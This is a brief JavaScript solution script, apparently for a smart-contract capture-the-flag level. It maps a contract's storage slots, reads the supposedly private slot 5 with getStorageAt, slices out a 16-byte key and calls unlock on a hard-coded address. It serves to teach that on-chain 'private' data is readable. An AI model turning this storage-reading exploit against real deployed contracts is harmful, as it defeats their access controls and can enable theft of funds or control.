
// we need to read data[2] from storage.
// considering the 32 byte blocks, we could say:
// [0]: 0, locked
// [1]: 0, ID
// [2]: 0, awkwardness, denomination, flattening
// [3]: data[0]
// [4]: data[1]
// [5]: data[2]
// so the element we want is at position 5.

const block = await web3.eth.getStorageAt("0x90BaC9Bd95F2f288AA9114308606123d119334fc", 5);

// as it is cast to bytes16 and it is a BE (big endian)
// representation, we just get the first 16 bytes
// (and the "0x" prefix)

const key = block.slice(0, 34);
await contract.unlock(key);